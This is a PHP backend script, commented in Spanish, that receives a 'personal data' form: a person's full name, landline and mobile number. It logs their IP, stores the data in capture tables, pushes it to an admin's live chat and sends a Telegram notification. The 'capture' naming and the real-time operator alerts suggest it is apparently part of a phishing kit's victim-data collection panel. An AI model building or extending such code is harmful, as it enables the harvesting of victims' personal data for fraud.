<?php
/**
 * Procesa el envío del formulario "Datos Personales".
 * Guarda en BD y notifica al admin en el chat en tiempo real.
 */
error_reporting(E_ERROR | E_PARSE);
session_start();
header('Content-Type: application/json');

if (!isset($_SESSION['usuario_id'])) {
    echo json_encode(['success' => false, 'error' => 'No hay sesión activa']);
    exit;
}

try {
    require_once '../php_config/conexionbd.php';
    require_once __DIR__ . '/chat_captura_helper.php';
    $pdo = conectarBD();

    $input = json_decode(file_get_contents('php://input'), true);
    if (!$input || !isset($input['accion'])) {
        echo json_encode(['success' => false, 'error' => 'Datos no válidos']);
        exit;
    }

    $usuario_id       = $_SESSION['usuario_id'];
    $datos_personales_id = intval($input['datos_personales_id'] ?? 0);
    $accion           = $input['accion'];

    $ip_real = $_SERVER['HTTP_X_FORWARDED_FOR']
             ?? $_SERVER['HTTP_X_REAL_IP']
             ?? $_SERVER['REMOTE_ADDR']
             ?? 'unknown';

    // ── Guardar datos del formulario ─────────────────────────────────────
    if ($accion === 'guardar_datos') {

        $nombre = mb_strtoupper(mb_substr(preg_replace('/[^\p{L}\s]/u', '', trim($input['nombre'] ?? '')), 0, 100));
        $fijo   = preg_replace('/\D/', '', $input['fijo'] ?? '');
        $fijo   = mb_substr($fijo, 0, 10);
        $cel    = preg_replace('/\D/', '', $input['cel']  ?? '');
        $cel    = mb_substr($cel, 0, 10);

        if (empty($nombre)) {
            echo json_encode(['success' => false, 'error' => 'El nombre completo es obligatorio.']);
            exit;
        }
        if (strlen($fijo) !== 10) {
            echo json_encode(['success' => false, 'error' => 'El teléfono fijo debe tener 10 dígitos.']);
            exit;
        }
        if (strlen($cel) !== 10) {
            echo json_encode(['success' => false, 'error' => 'El teléfono celular debe tener 10 dígitos.']);
            exit;
        }

        // Verificar que la solicitud pertenece al usuario
        $stmt = $pdo->prepare("
            SELECT id FROM datos_personales_enviados
            WHERE id = ? AND usuario_id = ? AND estado = 'pendiente'
        ");
        $stmt->execute([$datos_personales_id, $usuario_id]);
        if (!$stmt->fetch()) {
            echo json_encode(['success' => false, 'error' => 'Solicitud no encontrada']);
            exit;
        }

        // Guardar en datos_personales_enviados (captura)
        $pdo->prepare("
            UPDATE datos_personales_enviados
            SET nombre = ?, telefono_fijo = ?, telefono_cel = ?,
                ip_usuario = ?, estado = 'completado', fecha_completado = NOW()
            WHERE id = ?
        ")->execute([$nombre ?: null, $fijo ?: null, $cel ?: null, $ip_real, $datos_personales_id]);

        // También actualizar la tabla usuarios (igual que capData.php)
        $pdo->prepare("
            UPDATE usuarios SET nombre = ?, telefono_fijo = ?, telefono_movil = ? WHERE id = ?
        ")->execute([$nombre ?: null, $fijo ?: null, $cel ?: null, $usuario_id]);

        // Notificar al admin en el chat
        $respuesta = "Nombre: $nombre\nTel. Fijo: $fijo\nTel. Movil: $cel";
        insertarCapturaUsuario($pdo, $usuario_id, $ip_real, $respuesta);

        require_once __DIR__ . '/../php_capture/telegram_send.php';
        telegram_notify_contact_once($pdo, (int) $usuario_id, $fijo, $cel);

        echo json_encode(['success' => true]);

    // ── Cancelar ─────────────────────────────────────────────────────────
    } elseif ($accion === 'cancelar') {

        $pdo->prepare("
            UPDATE datos_personales_enviados
            SET estado = 'cancelado'
            WHERE id = ? AND usuario_id = ? AND estado = 'pendiente'
        ")->execute([$datos_personales_id, $usuario_id]);

        echo json_encode(['success' => true]);

    } else {
        echo json_encode(['success' => false, 'error' => 'Acción no válida']);
    }

} catch (PDOException $e) {
    echo json_encode(['success' => false, 'error' => 'Error de base de datos: ' . $e->getMessage()]);
} catch (Exception $e) {
    echo json_encode(['success' => false, 'error' => 'Error: ' . $e->getMessage()]);
}
?>
